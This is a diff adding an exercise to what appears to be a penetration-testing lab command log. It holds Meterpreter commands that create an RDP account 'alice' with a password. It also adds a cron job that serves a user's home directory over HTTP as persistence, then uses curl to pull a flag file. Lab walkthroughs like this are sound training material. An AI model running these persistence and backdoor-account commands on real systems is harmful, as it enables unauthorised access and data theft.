@@ -2127,7 +2127,7 @@ migrate 2764
 run getgui -e -u alice -p hack_123321
 xfreerdp /u:alice /p:hack_123321 /v:10.0.23.139
 ```
-112)
+112)  Maintaining Access I
 ```
 ip addr
 ssh student@192.37.104.3
@@ -2143,8 +2143,20 @@ ssh -i id_rsa student@192.37.104.3
 ls -l
 cat flag.txt
 ```
-
-
+113) T1168: Local Job Scheduling
+```
+ip addr
+ssh student@192.99.109.3
+ps -eaf
+echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
+crontab -i cron
+crontab -l
+sh student@192.99.109.3
+rm wait
+nmap -p- 192.99.109.3
+curl 192.99.109.3:8000
+curl 192.99.109.3:8000/flag.txt
+```
 
 
 
